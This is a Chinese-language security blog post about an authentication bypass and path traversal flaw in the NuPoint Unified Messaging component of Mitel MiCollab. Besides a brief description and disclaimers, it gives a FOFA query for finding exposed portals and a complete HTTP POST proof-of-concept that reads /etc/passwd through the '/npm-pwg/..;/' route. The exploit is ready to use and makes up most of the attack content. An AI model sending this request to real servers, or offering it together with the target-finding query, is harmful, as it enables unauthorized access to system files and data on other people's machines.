#  Mitel 企业协作平台 npm-pwg 任意文件读取漏洞   
 HK安全小屋   2025-04-26 07:12  
  
免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
漏洞描述：  
  
由于Mitel MiCollab软件的 NuPoint 统一消息 (NPM) 组件中存在身份验证绕过漏洞，并且输入验证不足，未经身份验证的远程攻击者可利用该漏洞执行路径遍历攻击，成功利用可能导致未授权访问、破坏或删除用户的数据和系统配置。  
  
影响版本：  
  
Mitel 企业协作平台  
  
fofa：  
```
body="MiCollab End User Portal"
```  
  
poc：  
```
POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Length: 683
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
_transaction=<transaction xmlns:xsi="http://www.w3.org/2000/10/XMLSchema-instance" xsi:type="xsd:Object"><transactionNum xsi:type="xsd:long">2</transactionNum><operations xsi:type="xsd:List"><elem xsi:type="xsd:Object"><criteria xsi:type="xsd:Object"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type="xsd:Object"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type="xsd:Object"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI3PHz7fiaevok224MrxJSOhRmJDNsaA739Faxpagibw7wUgw4oXmc93PuwwUDmHMhrFCgRXTJiaCny3Q/640?wx_fmt=png&from=appmsg "")  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
